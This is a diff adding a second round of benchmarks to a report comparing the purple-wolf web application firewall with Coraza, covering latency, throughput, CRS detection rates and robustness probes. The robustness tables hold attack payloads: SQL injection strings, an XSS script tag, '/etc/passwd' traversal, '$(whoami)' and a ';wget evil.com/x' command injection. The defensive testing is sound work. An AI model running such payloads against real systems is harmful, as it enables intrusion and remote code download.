@@ -248,6 +248,226 @@ resource-usage CSV. The committed `benchmarks/results/.gitkeep` keeps
 the directory present; raw results from this report's run are in
 [`benchmarks/results/20260528-205913/`](../benchmarks/results/20260528-205913/).
 
+## Round 2 — expanded matrix
+
+A second pass closing the open questions a fair skeptic raised after
+the original tables. Same cluster, same pods, same node. Added: a
+no-WAF baseline pod, a ramp-to-break sweep, a broader CRS corpus
+covering 12 attack classes (4536 vectors), a 10-min sustained soak
+with resource sampling, and a small functional robustness suite.
+
+Raw outputs:
+[`benchmarks/results/round2-20260528-233221/`](../benchmarks/results/round2-20260528-233221/).
+Methodology and topology are identical to round 1 unless noted.
+
+### Q1 — How much of the latency is the WAF vs Traefik itself?
+
+Stood up a third pod, [`bench-baseline`](../benchmarks/k8s/baseline.yaml)
+— identical Traefik 3.1 + whoami, **no middleware**. Same node, same
+resource ceiling, same vegeta target mix.
+
+| Target | 100 RPS p99 | 500 RPS p99 | 1000 RPS p99 | Notes |
+|---|---|---|---|---|
+| Traefik only (no WAF) | 1.0 ms | 0.8 ms | 0.7 ms | floor |
+| purple-wolf | 1.2 ms | 0.9 ms | 0.8 ms | +0.1–0.2 ms |
+| Coraza (round 1) | 2.3 ms | 28 139 ms | 30 001 ms | collapsed |
+
+**The WAF accounts for ~0.1–0.2 ms p99**, the rest is Traefik + the
+localhost round trip. The previous "purple-wolf adds < 1.2 ms" was an
+upper bound; the actual WAF cost is invisible at typical backend
+latencies.
+
+### Q2 — Where does purple-wolf actually break?
+
+Ramped past the original 1000 RPS ceiling at the same 200 m CPU /
+1 GiB budget:
+
+| RPS target | rate (actual) | p50 | p95 | p99 | success | state |
+|---|---|---|---|---|---|---|
+| 2000 | 2000 | 0.4 | 0.7 | 0.9 | 0.70 | clean |
+| 4000 | 4000 | 0.5 | 0.7–0.8 | 1.3 / 3.1 | 0.70 | clean, slight wobble |
+| 8000 | 8000 | 0.6 | 0.9 / 1.0 | 3.3 / 79.8 | 0.65 / 0.70 | stressed but mostly serving |
+| 12000 | 12000 | 0.1–0.4 | 2.8 / 82.4 | 13 616 / 27 374 | 0.13 / 0.33 | collapsing |
+| 16000 | 16000 | 0.1 | 13 / 232 | 30 001 | 0.0074 / 0.0099 | broken (vegeta timeout floor) |
+
+Break point is between 8000 and 12000 RPS at this budget on this
+node. Coraza collapsed at 500 RPS — **~16-20× more sustained RPS for
+purple-wolf at the same resource ceiling**.
+
+*Honest caveat about the ramp*: during the 16 000 RPS step the K3s
+API server on `homelab-01` became briefly unresponsive — etcd /
+control-plane sharing the node with the bench pods. The break point
+measurement is real, but anyone planning to push a single Traefik
+pod above ~8 k RPS in production should give it a dedicated node, or
+the WAF won't be the bottleneck but the kubelet will.
+
+### Q3 — Detection coverage across the broader CRS suite
+
+Extended the corpus from CRS 941 (XSS) + 942 (SQLi) to ten more rule
+classes from CRS v4.25.0. **4536 vectors total.** Same runner
+(simpler bash+curl loop this time — the Python streaming runner's
+buffering hid progress at the volumes we were driving), single-stream,
+no parallel load. Both WAFs fresh-restarted between runs.
+
+| CRS class | n | purple-wolf TPR | Coraza TPR | Δ (pw − crz) |
+|---|---|---|---|---|
+| `913` Scanner Detection | 7 | 14.3% | 42.9% | **−28.6%** (n=7, small) |
+| `920` Protocol Enforcement | 424 | 0.9% | 0.7% | +0.2% |
+| `921` Protocol Attack | 112 | 1.8% | 0.9% | +0.9% |
+| `930` LFI | 75 | 17.3% | 13.3% | +4.0% |
+| `931` RFI | 41 | 7.3% | 7.3% | 0.0% |
+| `932` RCE | 876 | 9.9% | 3.7% | +6.3% |
+| `933` PHP | 399 | 6.3% | 5.3% | +1.0% |
+| `934` Generic | 234 | 3.4% | 1.3% | +2.1% |
+| `941` XSS | 217 | 28.6% | 23.5% | +5.1% |
+| `942` SQLi | 934 | 13.0% | 13.6% | −0.6% |
+| `943` Session Fixation | 44 | 2.3% | 2.3% | 0.0% |
+| `944` Java | 1173 | 28.4% | 1.9% | **+26.5%** |
+| **OVERALL** | **4536** | **14.55%** | **6.11%** | **+8.4%** |
+
+Overall: **purple-wolf blocks 2.4× more attack vectors than Coraza
+across the broader OWASP CRS suite**, on the same Paranoia-1-
+equivalent inline ruleset. The Java margin is the largest single
+driver — likely because purple-wolf's signature aho-corasick covers
+some Java-attack patterns (deserialization markers, Spring-style
+template tags) that Coraza's `@detectXSS` / `@detectSQLi` won't see.
+
+The TPR numbers in absolute terms are still modest — 14% overall —
+which matches the "high-precision detection on real attacks; weak on
+atomic-token regression tests" honest framing from round 1. The
+broader sweep confirms the shape rather than overturning it.
+
+| | purple-wolf | Coraza (inline PL1) |
+|---|---|---|
+| Strong on | xss, java, lfi, rce, generic, sqli | scanner UA, sqli, lfi, rfi |
+| Weak on | protocol_enforcement, session_fixation, protocol_attack | most non-injection classes |
+| Tied | rfi, session_fixation | xss, sqli |
+
+### Q4 — Stability under a sustained workload
+
+10 minutes at 1000 RPS sustained, mixed attack-plus-benign mix,
+sampling Traefik container CPU + RSS every 10 seconds.
+
+| Metric | Value |
+|---|---|
+| Sustained rate | 1000 / s |
+| p50 / p95 / p99 latency | 0.4 / 0.7 / 0.8 ms |
+| success rate | 0.70 (stable across the whole window) |
+| Traefik CPU steady-state | 270 m (max 285 m) |
+| Traefik RSS time series | 36 → 80 → 89 → 96 → 87 → 88 → 91 → 86 MiB |
+| Memory drift after warmup | **none — bounded 86–96 MiB across the window** |
+
+The first cold-start sample shows 36 MiB; within 1 minute it's
+stable in the 80–96 MiB band and never drifts upward over the
+remaining 9 minutes. **No memory leak observable at 10-min scale at
+1000 RPS.** A 60-minute soak would be a stronger claim — see
+"caveats" below; we attempted 1h × 2000 RPS during round 2 but lost
+the run when the cluster API was destabilized by the parallel
+ramp-to-break load. Still on the to-do list.
+
+### Q5 — Robustness: header-borne attacks, structural anomalies, edge cases
+
+Surgical probes against bench-pw (one request at a time, no load).
+Raw log:
+[`benchmarks/results/round2-20260528-233221/robustness.txt`](../benchmarks/results/round2-20260528-233221/robustness.txt).
+
+**Header-borne attacks** (the v0.2 NEW-I4 surface):
+
+| Payload | Header | Status |
+|---|---|---|
+| `id=1 OR 1=1` | `Cookie` | **403** ✓ blocked |
+| `?q=<script>alert(1)</script>` | `Referer` | **403** ✓ blocked |
+| `1" OR "1"="1` | `X-User` (custom) | **403** ✓ blocked |
+| `Mozilla/5.0 1 OR 1=1` | `User-Agent` | 200 — *missed* |
+| `sessionid=abc123; csrftoken=xyz789` | `Cookie` (benign) | 200 ✓ no FP |
+
+Cookie / Referer / X-* SQLi all caught — the v0.2 header-inspection
+fix works correctly. The User-Agent SQLi miss is interesting:
+libinjection appears to be tolerant of trailing tokens preceded by
+a Mozilla prefix (treats the whole thing as a UA string, not a SQL
+expression). The signatures group catches scanner UAs by literal
+match but doesn't fire on a Mozilla-prefixed payload. **Documented
+gap** — operators relying on catching SQLi via User-Agent should not
+assume coverage. Workaround today: a custom signature in the operator's
+reputation deny list, or downstream WAF stage for UA inspection.
+
+**Path traversal:**
+
+| Payload | Status |
+|---|---|
+| `/../../etc/passwd` | **403** ✓ |
+| `/etc/passwd` (direct) | **403** ✓ |
+| `?f=../../../etc/passwd` | **403** ✓ |
+
+**RCE primitives in query string:**
+
+| Payload | Status |
+|---|---|
+| `;wget evil.com/x` | 200 — *missed* |
+| `$(whoami)` | **403** ✓ |
+| `/bin/sh` | **403** ✓ |
+
+The `;wget` miss is a real gap. The signatures group catches
+`/bin/sh` and `$(...)` (shell substitution markers) as literal
+patterns but doesn't have a bare-`;cmd` signature. **Documented
+gap** — for shell-style command injection coverage in the query,
+operators should add `;wget`, `;curl`, `;nc`, `;bash` to a custom
+signature set (or rely on backend input validation).
+
+**Structural anomalies (with default bench config: structural group
+not enabled):**
+
+| Method | Status |
+|---|---|
+| TRACE | 200 (not blocked) |
+| CONNECT | 200 (not blocked) |
+
+The default benchmark config has only `injection` and `signatures`
+groups enabled. Unusual methods would be caught by the `structural`
+group if enabled — operators should set
+`groups.structural.{enabled: true, mode: enforce}` for this coverage.
+
+**Body inspection** — attempted, inconclusive: the whoami backend
+returns 502 on POST bodies larger than its expected echo format, so
+we couldn't isolate the WAF body-inspection path from the upstream
+failure. Defer to the unit tests
+([`crates/purple-wolf-core/src/detectors/injection.rs`](../crates/purple-wolf-core/src/detectors/injection.rs))
+for body-cap correctness; live-stack measurement needs a different
+upstream.
+
+### Recalibrated TL;DR
+
+| Axis | Round 1 result | Round 2 sharpening |
+|---|---|---|
+| WAF latency cost | ~1.2 ms p99 at 1000 RPS (whole path) | **0.1–0.2 ms p99 isolated** |
+| Sustained throughput | 1000 RPS clean, p99 < 1.2 ms | **clean to 4000–8000 RPS, breaks 12k–16k** |
+| Memory steady-state | 38 MiB p50 | confirmed: 80–96 MiB band, no drift under 10-min load |
+| Detection efficacy | tied with Coraza on 941+942 | **2.4× more attacks blocked across 12 CRS classes** |
+| Known gaps | precision-over-recall on atomic tokens (by design) | **+ User-Agent SQLi miss + `;cmd` query miss documented** |
+| FPR | 0% on 53 benigns | unchanged (53 benigns is still small N) |
+
+### Caveats round 2 inherits + adds
+
+- The cluster destabilization at 12k–16k RPS is a real finding about
+  *node sharing*, not about the WAF — the K3s API + etcd + bench
+  pods + monitoring all compete on `homelab-01`. The result is still
+  useful as a ceiling: don't expect to run a single WAF pod past
+  ~8 k RPS on a shared node. Run the WAF on a dedicated node and the
+  ceiling moves.
+- The 60-minute soak is **not yet done**. We collected 10 min of
+  evidence with stable memory; a longer run is the right next step
+  but couldn't complete in this pass because of the parallel-load
+  cluster destabilization. Listed as an open follow-up.
+- The benign FPR is still measured on 53 hand-curated requests.
+  The right next step is a real benign trace (e.g., a captured day
+  of a small production service); that's a separate effort and not
+  attempted here.
+- Documented detection gaps (User-Agent SQLi, `;wget`) are honest
+  evidence of "no security software is perfect" — surface them in
+  operator docs so adopters can layer defenses they care about.
+
+---
+
 ## What this benchmark is *not*
 
 - A claim that purple-wolf is "better than Coraza." Coraza's native
